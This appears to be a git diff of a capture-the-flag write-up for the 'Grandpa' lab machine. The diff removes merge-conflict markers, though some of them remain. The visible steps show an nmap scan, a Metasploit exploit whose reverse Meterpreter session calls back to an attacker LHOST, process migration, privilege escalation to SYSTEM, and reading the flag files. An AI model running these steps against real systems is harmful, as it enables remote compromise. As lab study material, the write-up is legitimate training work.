@@ -14,9 +14,7 @@
 ```bash
 nmap -sV -sC -oA nmap/Grandpa 10.129.95.233
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 ![nmap](img/nmap.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
@@ -73,9 +71,7 @@ set RHOSTS 10.129.95.233
 set LHOST 10.10.14.156
 run
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 =======
 >>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf
 ![meterpreter](img/meterpreter.png)
@@ -83,7 +79,7 @@ run
 > Meterpreter session opened.
 
 ![lowprivi](img/lowprivi.png)
-<<<<<<< HEAD
+
 =======
 
 > Meterpreter session opened.
@@ -107,9 +103,7 @@ ps
 migrate 1896  # wmiprvse.exe
 getuid
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 ![migrate](img/migrate.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
@@ -136,9 +130,7 @@ use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 ![recon](img/recon.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
@@ -165,9 +157,7 @@ set SESSION 1
 set LHOST 10.10.14.156
 run
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 ![root](img/root.png)
 =======
 >>>>>>> 9f1f476 (Add files via upload)
@@ -194,9 +184,7 @@ Server username: NT AUTHORITY\SYSTEM
 ```bash
 cat C:\Users\[USERNAME]\Desktop\user.txt
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 ![userflag](img/userflag.png)
 =======
 
@@ -219,9 +207,7 @@ bdff5ec67c3cff017f2bedc146a5d869
 ```bash
 cat C:\Users\Administrator\Desktop\root.txt
 ```
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
+
 ![rootflag](img/rootflag.png)
 =======
 
